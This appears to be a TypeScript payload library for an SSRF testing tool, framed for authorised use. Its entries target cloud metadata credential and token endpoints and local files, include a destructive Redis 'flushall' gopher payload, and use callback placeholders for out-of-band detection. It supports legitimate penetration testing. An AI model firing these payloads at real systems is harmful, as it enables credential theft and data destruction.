/**
 * SSRF payloads for authorised testing. `{CALLBACK_URL}` and `{CALLBACK_HOST}` stand for a callback
 * address the tester brings (their own server, Burp Collaborator, interactsh). This site does not
 * run a listener, so it cannot tell whether a payload was fetched: watch your own callback for hits.
 */

export type SsrfRisk = 'low' | 'medium' | 'high' | 'critical';

export interface SSRFPayload {
    id: string;
    name: string;
    payload: string;
    description: string;
    category: string;
    riskLevel: SsrfRisk;
    context: string;
    example: string;
}

export const SSRF_CATEGORIES = [
    { id: 'all', name: 'All payloads' },
    { id: 'aws', name: 'AWS cloud' },
    { id: 'gcp', name: 'Google Cloud' },
    { id: 'azure', name: 'Azure cloud' },
    { id: 'internal', name: 'Internal network' },
    { id: 'bypass', name: 'Protocol bypass' },
    { id: 'oob', name: 'Out-of-band (needs a callback)' },
] as const;

export const CALLBACK_PLACEHOLDERS = ['{CALLBACK_URL}', '{CALLBACK_HOST}'];

/** Fills the callback placeholders. A payload that needs a callback is returned unchanged when none is set. */
export function fillCallback(payload: string, callbackUrl: string | null): string {
    if (!callbackUrl) return payload;
    let host = '';
    try { host = new URL(callbackUrl).hostname; } catch { return payload; }
    return payload.split('{CALLBACK_URL}').join(callbackUrl).split('{CALLBACK_HOST}').join(host);
}

export const needsCallback = (payload: string) => CALLBACK_PLACEHOLDERS.some((p) => payload.includes(p));

/** A callback address: http(s), a host name or IP, no credentials. Returns the cleaned URL. */
export function parseCallbackUrl(raw: string): { ok: true; value: string } | { ok: false; error: string } {
    const text = raw.trim();
    if (!text) return { ok: false, error: 'Paste the callback URL your listener gave you.' };
    const withScheme = /^[a-z][a-z0-9+.-]*:\/\//i.test(text) ? text : `http://${text}`;
    try {
        const url = new URL(withScheme);
        if (url.protocol !== 'http:' && url.protocol !== 'https:') return { ok: false, error: 'Use an http or https address.' };
        if (url.username || url.password) return { ok: false, error: 'Leave out the user name and password.' };
        if (!url.hostname) return { ok: false, error: 'That address has no host.' };
        return { ok: true, value: url.href.replace(/\/$/, '') };
    } catch {
        return { ok: false, error: 'That is not a valid address.' };
    }
}

export const SSRF_PAYLOADS: SSRFPayload[] = [
    // AWS Cloud Metadata
    {
        id: 'aws-metadata-1',
        name: 'AWS Metadata Service',
        payload: 'http://169.254.169.254/latest/meta-data/',
        description: 'Access AWS instance metadata service',
        category: 'aws',
        riskLevel: 'critical',
        context: 'AWS EC2 instances',
        example: 'Returns instance metadata including IAM roles'
    },
    {
        id: 'aws-metadata-2',
        name: 'AWS IAM Credentials',
        payload: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
        description: 'Extract AWS IAM role credentials',
        category: 'aws',
        riskLevel: 'critical',
        context: 'AWS EC2 with IAM roles',
        example: 'Returns temporary AWS access keys'
    },
    {
        id: 'aws-metadata-3',
        name: 'AWS User Data',
        payload: 'http://169.254.169.254/latest/user-data',
        description: 'Access instance user data (often contains secrets)',
        category: 'aws',
        riskLevel: 'high',
        context: 'AWS EC2 initialization',
        example: 'May contain startup scripts with credentials'
    },

    // Google Cloud Platform
    {
        id: 'gcp-metadata-1',
        name: 'GCP Metadata Service',
        payload: 'http://metadata.google.internal/computeMetadata/v1/',
        description: 'Access GCP instance metadata',
        category: 'gcp',
        riskLevel: 'critical',
        context: 'Google Cloud instances',
        example: 'Requires Metadata-Flavor: Google header'
    },
    {
        id: 'gcp-token',
        name: 'GCP Service Account Token',
        payload: 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token',
        description: 'Extract GCP service account access token',
        category: 'gcp',
        riskLevel: 'critical',
        context: 'GCP Compute Engine',
        example: 'Returns OAuth 2.0 access token'
    },

    // Azure Cloud
    {
        id: 'azure-metadata-1',
        name: 'Azure Metadata Service',
        payload: 'http://169.254.169.254/metadata/instance?api-version=2021-02-01',
        description: 'Access Azure instance metadata',
        category: 'azure',
        riskLevel: 'high',
        context: 'Azure Virtual Machines',
        example: 'Returns VM configuration and network info'
    },
    {
        id: 'azure-token',
        name: 'Azure Access Token',
        payload: 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/',
        description: 'Extract Azure managed identity token',
        category: 'azure',
        riskLevel: 'critical',
        context: 'Azure VMs with managed identity',
        example: 'Returns Azure Resource Manager access token'
    },

    // Internal Network Discovery
    {
        id: 'internal-admin-1',
        name: 'Internal Admin Panel',
        payload: 'http://127.0.0.1:8080/admin',
        description: 'Access internal admin interfaces',
        category: 'internal',
        riskLevel: 'high',
        context: 'Internal web applications',
        example: 'Common admin panel on localhost'
    },
    {
        id: 'internal-api-1',
        name: 'Internal API Endpoint',
        payload: 'http://192.168.1.1/api/config',
        description: 'Access internal API configurations',
        category: 'internal',
        riskLevel: 'medium',
        context: 'Private network APIs',
        example: 'Internal router or device configuration'
    },
    {
        id: 'internal-db-1',
        name: 'Database Admin Interface',
        payload: 'http://10.0.0.100:8080/phpmyadmin',
        description: 'Access database management interfaces',
        category: 'internal',
        riskLevel: 'high',
        context: 'Internal database servers',
        example: 'phpMyAdmin or similar DB tools'
    },

    // Protocol Bypass
    {
        id: 'file-passwd',
        name: 'Local File Read',
        payload: 'file:///etc/passwd',
        description: 'Read local system files',
        category: 'bypass',
        riskLevel: 'high',
        context: 'File protocol support',
        example: 'Unix/Linux password file'
    },
    {
        id: 'gopher-redis',
        name: 'Redis Command Injection',
        payload: 'gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a',
        description: 'Execute Redis commands via Gopher protocol',
        category: 'bypass',
        riskLevel: 'critical',
        context: 'Gopher protocol support',
        example: 'Flush all Redis data'
    },
    {
        id: 'dict-service',
        name: 'DICT Protocol Probe',
        payload: 'dict://127.0.0.1:11211/stats',
        description: 'Probe services using DICT protocol',
        category: 'bypass',
        riskLevel: 'medium',
        context: 'DICT protocol support',
        example: 'Memcached service discovery'
    },

    // DNS Exfiltration
    {
        id: 'dns-exfil-1',
        name: 'DNS Exfiltration',
        payload: 'http://ssrf-test.{CALLBACK_HOST}/',
        description: 'Trigger DNS lookup for out-of-band detection',
        category: 'oob',
        riskLevel: 'medium',
        context: 'DNS resolution logging',
        example: 'Monitor DNS queries to confirm SSRF'
    },
    {
        id: 'http-callback',
        name: 'HTTP Callback',
        payload: '{CALLBACK_URL}',
        description: 'HTTP request to the callback URL you bring',
        category: 'oob',
        riskLevel: 'medium',
        context: 'HTTP request logging',
        example: 'Direct HTTP callback detection'
    }
];
